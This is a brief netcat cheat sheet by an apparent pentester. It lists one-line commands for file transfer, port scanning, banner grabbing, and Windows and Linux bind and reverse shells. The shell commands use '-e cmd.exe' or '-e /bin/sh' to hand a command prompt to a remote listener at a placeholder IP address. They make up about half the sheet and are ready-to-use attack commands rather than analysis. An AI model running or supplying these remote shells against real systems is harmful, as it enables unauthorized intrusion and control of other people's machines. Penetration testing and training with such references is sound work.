# Netcat Cheat Sheet
# Jose Moruno Cadima <sniferl4bs>

#Transfering a File
nc -lvp 4444 > output.txt        #Recei
nc -nv <IP Address> < input.txt #Send

#Netcat Bind Shell (Windows)
nc -lvp 4444 -e cmd.exe
nc -nv <IP Address> 4444 #Connect to the shell

#Netcat Bind Shell (Linux)
nc -lvp 4444 -e /bin/sh
nc -nv <IP Address> 4444           #Connect to the shell

#Netcat Reverse Shell (Windows)
nc -lvp 443  # Listening for connection
nc -nv <IP Address> 443 -e cmd.exe

#Netcat Reverse Shell (Linux)
nc -lvp 443
nc -nv <IP Address> 443 -e /bin/sh

#Netcat - Port Scanner
nc -z <IP Address> <Port Range in abc - xyz format>

#Netcat Banner Grabbing
echo "" | nc -nv -w1 <IP Address> <Ports>
